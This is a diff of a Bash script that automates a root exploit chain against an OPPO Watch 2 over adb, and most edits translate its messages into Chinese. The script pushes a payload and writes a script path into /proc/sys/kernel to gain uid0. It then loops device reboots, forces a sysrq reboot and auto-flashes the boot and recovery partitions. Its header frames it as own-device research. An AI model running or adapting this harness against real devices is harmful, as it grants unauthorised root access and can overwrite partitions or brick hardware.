@@ -1,15 +1,26 @@
 #!/bin/bash
-# rc17_hunt_v2.sh [max_boots] —— 快速稳定版磨机（2026-09-25，基于 rc17_hunt.sh v20+D-C111）
+# =============================================================================
+# rc17_hunt_v2.sh [最大轮数] —— OPPO Watch 2（OW20W1）完整利用链磨机
+#                              （2026-09-25，基于 rc17_hunt.sh v20+D-C111）
+#
+# © 慕寒 2026 保留部分权利
+#   保留署名权与部分权利；仅供在自有设备上做安全研究，误用后果自负。
+#
+# 运行环境：仅 Windows（Git Bash）。由 一键Root.bat → auto_root.sh 调用，
+#           也可手动：bash rc17_hunt_v2.sh [最大轮数]
+#
+# 【利用链完整性】GATEONLY 默认 0 = 完整利用链（开窗 + 换 cred → uid0）。
+#   原版第 180 行 `GATEONLY=${GATEONLY:-1}` 是个陷阱：首轮监视阶段把变量钉成 1 之后，
+#   后续每轮 launch 都发 gateonly=1（只开窗不换 cred，结构上不可能 uid0）。
+#   本版默认固定为 0，确保每一轮都跑完整链；只有调试“只开窗”时才显式给 GATEONLY=1。
 #
 # 相对原版的六项改进（依据 analysis_a\report.md 的台账复核，全部主机侧、不动 .so）：
-#   V2-1  GATEONLY 默认 0（完整链）。原版第 180 行 `GATEONLY=${GATEONLY:-1}` 是个陷阱：
-#         首轮监视阶段把变量钉成 1 之后，后续每轮 launch 都发 gateonly=1（只开窗不换 cred，
-#         结构上不可能 uid0）。改回 0 后命中恢复正常。
+#   V2-1  GATEONLY 默认 0（完整利用链，见上）。
 #   V2-2  rc_live.txt 主机 logcat 命中通道常驻采集（原版只读不写——外部采集根本没跑；
 #         命中后设备很快复位，设备侧文件来不及查，只有它能抓到）。
 #   V2-3  完整链模式 NPOLL 6→30（90s→450s）：单窗可能 stall 数十秒、整链可能达数分钟；
 #         轮次照旧在链打印终态标记或设备复位时提前收，所以长轮询只在链活着时花钱。
-#   V2-4  devup 硬化：最多等 180s（原版 ~45s 放弃），60s 才动 kill-server——no-device 抖动
+#   V2-4  devup 硬化：最多等 180s（原版 ~45s 放弃），60s 才动 kill-server——设备掉线抖动
 #         通常 30–60s 内自愈。
 #   V2-5  uptime 门 80→60s（UPTIME_MIN 可覆盖）：每轮省 ~20s = +13% 轮/h，无已知副作用。
 #   V2-6  冷启动检查点：每 COLD_EVERY=25 轮提示一次电池冷启动（ADSP 会话池/驱动
@@ -18,6 +29,8 @@
 #         TWRP adb4 recovery→sysrq 重启。最终态 = v7 永久 root + TWRP，无需人工。
 # 不动的部分：证据守卫（D-C110/D-C111 四通道）、幂等预置、payload 校验重推、单例锁、
 # 命中即停保现场、launch 参数全套（rc=2 ntrig=0 trial0=0 phase=5 cand=7 sprayms=30）。
+# =============================================================================
+# ---------- 基础配置（均可由环境变量覆盖） ----------
 set -u
 export MSYS_NO_PATHCONV=1
 SER="${RC_SERIAL:-fcf6458f}"
@@ -35,12 +48,13 @@ RECOVERY_AUTOFLASH=${RECOVERY_AUTOFLASH:-1}   # V2-8: 命中后自动刷入维�
 # 主机侧可按检测到的固件版本覆盖（auto_root.sh 会 export 对应 A.89/A.92 的镜像名）
 REC_IMG="${REC_IMG:-twrp-3.7.0_9-ow20w3-recovery_A92_adb4.img}"
 HERE="$(cd "$(dirname "$0")" && pwd)"; cd "$HERE"
+# ---------- 单例锁（防重复启动；断电死锁自动放行） ----------
 _singleton() {
   local pidf="$1" name="$2" old
   if [ -f "$pidf" ]; then
     old=$(cat "$pidf" 2>/dev/null)
     if [ -n "$old" ] && kill -0 "$old" 2>/dev/null; then
-      echo "$(date +%H:%M:%S) another $name (pid $old) alive -> refusing to start" >> rc17_singleton.log
+      echo "$(date +%H:%M:%S) 检测到另一个 $name（pid $old）仍在运行 → 拒绝重复启动" >> rc17_singleton.log
       exit 0
     fi
   fi
@@ -49,6 +63,7 @@ _singleton() {
 }
 _singleton "$(cd "$(dirname "$0")" && pwd)/rc17_hunt.pid" "rc17_hunt_v2.sh"
 
+# ---------- 通用工具 ----------
 LOG="rc17_log.txt"; LLOG="rc17_launch.log"; HB="rc17_heartbeat.txt"
 say(){ printf '%s\n' "$*" | tee -a "$LOG"; }
 S(){ timeout 30 $D shell "$1" 2>/dev/null | tr -d '\r'; }
@@ -61,12 +76,14 @@ DEVT(){ S 'date +"%m-%d %H:%M:%S.000"' 2>/dev/null; }
 # startup_clean: 每次启动/重置都执行 —— 设备侧证据与日志 + 主机侧会话文件轮转归档。
 # /cache/root_proof.txt 由 root 窗口写入、shell 清不掉: 守卫按 mtime 新鲜度判定(V2-7)。
 startup_clean(){
-  say "clean: device evidence/logs + host session files"
+  say "清理：设备侧证据/日志 + 主机会话文件"
   S 'rm -f /data/local/tmp/zzq1.log' >/dev/null 2>&1
   S ': > /data/local/tmp/root_proof.txt' >/dev/null 2>&1
   S 'rm -f /cache/root_proof.txt' >/dev/null 2>&1
   S 'logcat -c' >/dev/null 2>&1
-  [ -n "$(S 'test -s /cache/root_proof.txt && echo yes')" = "yes" ] && say "  note: /cache/root_proof.txt is root-owned; the guard uses mtime freshness (V2-7)"
+  if [ "$(S 'test -s /cache/root_proof.txt && echo yes')" = "yes" ]; then
+    say "  提示：/cache/root_proof.txt 是 root 属主（shell 清不掉），守卫按 mtime 新鲜度判定（V2-7）"
+  fi
   mkdir -p old_logs 证据归档
   ts=$(date +%Y%m%d_%H%M%S)
   for f in rc17_log.txt rc17_launch.log rc17_heartbeat.txt auto_root_hunt.log rc17_singleton.log; do
@@ -76,7 +93,7 @@ startup_clean(){
     [ -e "$f" ] && mv $f 证据归档/ 2>/dev/null
   done
   : > rc_live.txt
-  say "clean done (old sessions in old_logs/, hit evidence in 证据归档/)"
+  say "清理完成（历史会话 → old_logs/，命中证据 → 证据归档/）"
 }
 # reset 模式: 只做清理后退出
 if [ "${1:-}" = "reset" ]; then
@@ -111,22 +128,22 @@ evidence_guard(){ local ts p=0 z=0 c=0 k=0 km ct
   ts=$(date +%Y%m%d_%H%M%S)
   if [ "$p" = 1 ]; then
     timeout 60 $D pull /data/local/tmp/root_proof.txt "root_proof_${ts}.txt" >/dev/null 2>&1 \
-      && say "D-C110: proof pulled to host -> root_proof_${ts}.txt" \
-      || say "WARN: D-C110 proof pull failed (evidence stays on device)"
+      && say "D-C110：命中证据已拉到主机 → root_proof_${ts}.txt" \
+      || say "警告 D-C110：root_proof.txt 拉取失败（证据仍留在设备上）"
   fi
   if [ "$z" = 1 ]; then
     timeout 60 $D pull /data/local/tmp/zzq1.log "zzq1_log_${ts}.txt" >/dev/null 2>&1 \
-      && say "D-C110: zzq1.log pulled to host -> zzq1_log_${ts}.txt" \
-      || say "WARN: D-C110 zzq1.log pull failed (evidence stays on device)"
+      && say "D-C110：命中证据已拉到主机 → zzq1_log_${ts}.txt" \
+      || say "警告 D-C110：zzq1.log 拉取失败（证据仍留在设备上）"
   fi
   if [ "$c" = 1 ]; then
     timeout 60 $D pull /cache/root_proof.txt "root_proof_cache_${ts}.txt" >/dev/null 2>&1 \
-      && say "D-C111: /cache proof pulled to host -> root_proof_cache_${ts}.txt" \
-      || say "WARN: D-C111 /cache pull failed (evidence stays on device)"
+      && say "D-C111：/cache 命中证据已拉到主机 → root_proof_cache_${ts}.txt" \
+      || say "警告 D-C111：/cache 证据拉取失败（证据仍留在设备上）"
   fi
   if [ "$k" = 1 ]; then
     printf '%s\n' "$km" > "proofkey_dmesg_${ts}.txt"
-    say "D-C111: PROOFKEY in dmesg -> proofkey_dmesg_${ts}.txt"
+    say "D-C111：dmesg 抓到 PROOFKEY → proofkey_dmesg_${ts}.txt"
   fi
   return 0; }
 push_payload(){ local i hm dm
@@ -140,13 +157,13 @@ push_payload(){ local i hm dm
   done
   return 1; }
 
-# V2-8: 命中收尾——自动刷入维护 recovery（TWRP adb4）。
+# ---------- 命中收尾：自动刷入维护 recovery（V2-8）----------
 # 为什么在命中之后而不是窗口内：一次命中窗口里 App 只能刷 boot（.so 的 flash_guarded 硬编码
 # boot 分区），recovery 要等 v7 起来、主机拿到 uid0，再走 recovery 通道刷（flash_partition_
 # from_recovery.sh 自带"进 recovery→推送校验→dd→整分区回读"），刷完 sysrq 重启。
 # 最终态 = v7 永久 root + TWRP，全程无需人工。RECOVERY_AUTOFLASH=0 可关闭。
 auto_flash_recovery(){ [ "$RECOVERY_AUTOFLASH" = 1 ] || return 0
-  [ -f "$REC_IMG" ] || { say "skip recovery autoflash: $REC_IMG 缺失"; return 0; }
+  [ -f "$REC_IMG" ] || { say "跳过 recovery 自动刷写：$REC_IMG 缺失"; return 0; }
   say "=== 命中收尾：自动刷入维护 recovery（TWRP adb4，回读校验）==="
   ST=$(S 'get-state')
   if [ "$ST" != "recovery" ]; then
@@ -158,16 +175,16 @@ auto_flash_recovery(){ [ "$RECOVERY_AUTOFLASH" = 1 ] || return 0
       [ "$okr" = 1 ] && break
       [ "$att" = 1 ] && { say "  第一次等待未见到 recovery，再次发送重启命令…"; $D reboot recovery >/dev/null 2>&1; }
     done
-    [ "$okr" = 1 ] && say "  ✓ 已进入 recovery" || { say "WARN: 未能进入 recovery —— 无损，可按 README《维护通道》手动重试。"; return 0; }
+    [ "$okr" = 1 ] && say "  ✓ 已进入 recovery" || { say "警告：未能进入 recovery —— 无损，可按 README《维护通道》手动重试。"; return 0; }
   fi
   if bash flash_partition_from_recovery.sh "$REC_IMG" recovery; then
     S 'echo b > /proc/sysrq-trigger' 2>/dev/null
     say "✓ recovery 已刷入并重启。最终态：v7 永久 root + TWRP（adb reboot recovery 进入）。"
   else
-    say "WARN: recovery 刷写未确认成功 —— 设备仍在 v7，无损，可按 README《维护通道》手动重试。"
+    say "警告：recovery 刷写未确认成功 —— 设备仍在 v7，无损，可按 README《维护通道》手动重试。"
   fi; }
 
-# ---- V2-2: 常驻主机 logcat 采集（命中主通道，D-C110）----
+# ---------- 7. 常驻主机 logcat 采集（V2-2，命中主通道 D-C110）----------
 # 循环重连以跨越设备复位；写 rc_live.txt（append，跨 boot 连续，launch 用字节偏移切片）。
 CAPTURE_PID_FILE="rc17_capture.pid"
 stop_capture(){ [ -f "$CAPTURE_PID_FILE" ] && { kill "$(cat "$CAPTURE_PID_FILE")" 2>/dev/null; rm -f "$CAPTURE_PID_FILE"; }; }
@@ -183,9 +200,9 @@ trap 'stop_capture; rm -f rc17_hunt.pid; exit 130' INT TERM
 startup_clean
 start_capture
 
-say "$(date +%H:%M:%S) RC17-v2-fast: GATEONLY=$GATEONLY NPOLL=$NPOLL UPTIME_MIN=$UPTIME_MIN COLD_EVERY=$COLD_EVERY DEVUP_MAX=$DEVUP_MAX recovery=$RECOVERY_AUTOFLASH capture=on"
+say "$(date +%H:%M:%S) RC17-v2-fast 启动：GATEONLY=$GATEONLY（0=完整利用链） NPOLL=$NPOLL UPTIME_MIN=$UPTIME_MIN COLD_EVERY=$COLD_EVERY DEVUP_MAX=$DEVUP_MAX recovery=$RECOVERY_AUTOFLASH capture=on"
 echo "$(date +%H:%M:%S) start v2-fast" >> "$HB"
-push_payload || say "WARN: /data/local/tmp/x push failed (rc_child execs that path)"
+push_payload || say "警告：/data/local/tmp/x 推送失败（rc 子进程要执行的就是这个路径）"
 timeout 20 $D push mod.sh /data/local/tmp/mod.sh >/dev/null 2>&1
 timeout 15 $D shell 'chmod 755 /data/local/tmp/mod.sh' >/dev/null 2>&1
 timeout 15 $D shell 'p=/data/local/tmp/root_proof.txt; z=/data/local/tmp/zzq1.log; test -s $p || touch $p; test -s $z || touch $z; chmod 666 $p $z' >/dev/null 2>&1
@@ -193,11 +210,12 @@ harvest(){ timeout 20 $D shell 'printf "%s" /data/local/tmp/mod.sh > /proc/sys/k
 '; }
 
 
+# ---------- 8. 主循环：证据守卫 → 复位 → 拉起完整链 → 轮询 → 收尾 ----------
 for boot in $(seq 1 "$MAXB"); do
   say ""; say "##### RC17 BOOT $boot/$MAXB $(date +%H:%M:%S) #####"; echo "$(date +%H:%M:%S) boot$boot" >> "$HB"
-  devup || { say "no-device"; sleep 10; continue; }
+  devup || { say "设备不在线，10 秒后重试"; sleep 10; continue; }
   if evidence_guard; then
-    say "*** hit evidence (proof/zzq1.log/kmsg//cache) BEFORE boot reboot -> STOPPING (preserving scene) ***"
+    say "*** 发现命中证据（proof/zzq1.log/kmsg//cache，本轮重启前）→ 停机保现场 ***"
     S 'id; echo ---; cat /data/local/tmp/root_proof.txt 2>/dev/null; echo ---; tail -10 /data/local/tmp/zzq1.log 2>/dev/null; echo ---; cat /cache/root_proof.txt 2>/dev/null; echo ---; dmesg 2>/dev/null | grep -a PROOFKEY | tail -3; echo ---; getenforce'
     auto_flash_recovery
     exit 0
@@ -207,7 +225,7 @@ for boot in $(seq 1 "$MAXB"); do
   while :; do up=$(S 'cut -d. -f1 /proc/uptime'); [ "${up:-0}" -ge "$UPTIME_MIN" ] && break; sleep 4; done
   b0id=$(BID)
   if evidence_guard; then
-    say "*** hit evidence at boot start -> STOPPING (preserving scene) ***"
+    say "*** 开机即发现命中证据 → 停机保现场 ***"
     S 'id; echo ---; cat /data/local/tmp/root_proof.txt 2>/dev/null; echo ---; tail -10 /data/local/tmp/zzq1.log 2>/dev/null; echo ---; cat /cache/root_proof.txt 2>/dev/null; echo ---; dmesg 2>/dev/null | grep -a PROOFKEY | tail -3; echo ---; getenforce'
     auto_flash_recovery
     exit 0
@@ -215,7 +233,7 @@ for boot in $(seq 1 "$MAXB"); do
   timeout 15 $D shell 'rm -f /data/local/tmp/zzq1.log /data/local/tmp/x.log' >/dev/null 2>&1
   timeout 15 $D shell 'p=/data/local/tmp/root_proof.txt; z=/data/local/tmp/zzq1.log; test -s $p || touch $p; test -s $z || touch $z; chmod 666 $p $z' >/dev/null 2>&1
   if evidence_guard; then
-    say "*** hit evidence just before launch -> STOPPING (preserving scene) ***"
+    say "*** 拉起载体 App 前发现命中证据 → 停机保现场 ***"
     S 'id; echo ---; cat /data/local/tmp/root_proof.txt 2>/dev/null; echo ---; getenforce'
     auto_flash_recovery
     exit 0
@@ -225,43 +243,43 @@ for boot in $(seq 1 "$MAXB"); do
 
   LT0=$(wc -c < rc_live.txt 2>/dev/null || echo 0)
   T0=$(DEVT)
-  launch_rc || { say "device lost in launch_rc"; continue; }
-  say "launched (rc=$(S 'getprop debug.p2.rc') ntrig=$(S 'getprop debug.p2.ntrig') gateonly=$GATEONLY spray=$SPRAYMS) at $(date +%H:%M:%S); polling (max $((NPOLL*15))s)"
+  launch_rc || { say "launch_rc 期间设备掉线 → 跳过本轮"; continue; }
+  say "已拉起载体 App（rc=$(S 'getprop debug.p2.rc') ntrig=$(S 'getprop debug.p2.ntrig') gateonly=$GATEONLY spray=$SPRAYMS）于 $(date +%H:%M:%S)；开始轮询（上限 $((NPOLL*15)) 秒）"
   for w in $(seq 1 $NPOLL); do sleep 15; check_root; case "$v" in *ROOTED*|*uid0*) break;; esac
     if evidence_guard; then
-      echo "$(date +%H:%M:%S) *** UID0 ACHIEVED (device evidence mid-poll) ***" >> "$HB"
+      echo "$(date +%H:%M:%S) *** UID0 ACHIEVED —— 轮询中发现设备证据 ***" >> "$HB"
       break
     fi
     harvest >/dev/null 2>&1
-    bn2=$(BID); [ "${bn2:0:8}" != "${b0id:0:8}" ] && { echo "$(date +%H:%M:%S) reset during poll" >> "$HB" 2>/dev/null; break; }
+    bn2=$(BID); [ "${bn2:0:8}" != "${b0id:0:8}" ] && { echo "$(date +%H:%M:%S) 轮询期间设备复位" >> "$HB" 2>/dev/null; break; }
     lt=$(tail -c +"$((LT0+1))" rc_live.txt 2>/dev/null | grep -ac "RC2: done without uid=0\|no identity-proven tail task\|never landed this boot\|CHAIN SUCCESS\|ADSP wedged\|RC CHILD ROOTED\|sleeping forever\|keeping EVERYTHING open")
     [ "${lt:-0}" != "0" ] && break
   done
   lc=$(lc_since "$T0" | grep -E "RC2|RC window|comm seen|carrier|VERIFIED|swap round|CHAIN SUCCESS|RC CHILD|selinux|enforce|tailV|exhausted|TRIGGER: MUNMAP|VERDICT|DEAD fl|SKIP|no reclaim|spray: [0-9]+ x|ARMED|readback|enospc" | tail -14 | tr '\n' '|')
   check_root
   hlt=$(tail -c +"$((LT0+1))" rc_live.txt 2>/dev/null | grep -a "RC CHILD ROOTED\|CHAIN SUCCESS\|RC kmsg: PROOFKEY.*euid=0" | tail -3 | tr '\n' '|')
-  say "RC17-v2 result [$v]"
-  say "   app=[$lc] hit_logcat=[$hlt] getenforce=[$(S getenforce)] panic=[$(PAN)]"
+  say "RC17-v2 本轮结果 [$v]"
+  say "   载体链=[$lc] 命中logcat=[$hlt] getenforce=[$(S getenforce)] panic=[$(PAN)]"
   { printf '\n--- IN-APP CHAIN %s ---\n%s\n' "$(date +%H:%M:%S)" "$lc" >> "$LLOG"; }
   case "$v" in *ROOTED*|*uid0*|*xuid0*)
-    say "*** UID0 ACHIEVED (in-app chain) ***"
+    say "*** UID0 ACHIEVED —— 载体 App 内完整链命中 ***"
     evidence_guard
     S 'id; echo ---; cat /data/local/tmp/root_proof.txt 2>/dev/null; echo ---; tail -10 /data/local/tmp/zzq1.log 2>/dev/null; echo ---; cat /cache/root_proof.txt 2>/dev/null; echo ---; dmesg 2>/dev/null | grep -a PROOFKEY | tail -3; echo ---; getenforce'
     auto_flash_recovery
     exit 0;;
   esac
   if [ -n "$hlt" ]; then
-    say "*** UID0 ACHIEVED (host logcat evidence: $hlt) ***"
+    say "*** UID0 ACHIEVED —— 主机 logcat 证据：$hlt ***"
     evidence_guard
     S 'id; echo ---; cat /data/local/tmp/root_proof.txt 2>/dev/null; echo ---; tail -10 /data/local/tmp/zzq1.log 2>/dev/null; echo ---; cat /cache/root_proof.txt 2>/dev/null; echo ---; dmesg 2>/dev/null | grep -a PROOFKEY | tail -3; echo ---; getenforce'
     auto_flash_recovery
     exit 0
   fi
-  bn=$(BID); [ "$bn" != "$b0id" ] && say "reset during the chain"
-  say "boot done without root"
+  bn=$(BID); [ "$bn" != "$b0id" ] && say "链执行期间设备复位"
+  say "本轮未命中 root"
   # V2-6: 冷启动检查点——每 COLD_EVERY 轮提示电池冷启动（会话池/驱动劣化的唯一被证实出口）
   if [ $((boot % COLD_EVERY)) = 0 ] && [ "$boot" -lt "$MAXB" ]; then
-    say "##### COLD-BOOT CHECKPOINT (boot $boot) #####"
+    say "##### 冷启动检查点（第 $boot 轮）#####"
     say "  请给手表一次电池冷启动：拔 USB（可选）→ 长按侧键 12 秒关机 → 再开机 → 插回 USB"
     say "  我会等它离线再回线（最长 15 分钟），期间磨机挂起；不操作则 15 分钟后自动继续干磨。"
     offline_seen=0; t0=$SECONDS
@@ -282,4 +300,4 @@ for boot in $(seq 1 "$MAXB"); do
     fi
   fi
 done
-say "RC17-v2 exhausted $MAXB boots without uid0"
+say "RC17-v2 已跑满 $MAXB 轮，仍未命中 uid0"
